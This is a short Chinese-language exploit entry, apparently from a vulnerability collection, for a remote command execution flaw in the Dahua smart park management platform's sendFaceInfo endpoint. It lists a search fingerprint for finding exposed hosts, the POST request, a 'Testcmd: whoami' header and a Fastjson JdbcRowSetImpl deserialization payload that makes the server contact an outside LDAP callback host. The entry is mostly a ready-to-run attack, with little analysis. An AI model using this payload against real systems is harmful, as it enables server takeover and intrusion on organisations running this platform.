# 大华智慧园区综合管理平台sendFaceInfo远程命令执行

- **系统**：大华　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter:`app.name="Dahua 大华 智慧园区管理平台"`\`
- **请求**：`POST /CardSolution/card/face/sendFaceInfo HTTP/1.1`
- **关键头**：`Content-Length: 216`　`Content-Type: application/json`　`Testcmd: whoami`

**请求体 / payload**
```
{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://qq6t3h.dnslog.cn","autoCommit":true}}}

```

**其他**
- 大华智慧园区综合管理平台sendFaceInfo 远程命令执行: * 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。大华智慧园区综合管理平台sendFaceInfo远程命令执行，攻击者可通过该漏洞获取服务器权限。
- 版本: * 大华智慧园区综合管理平台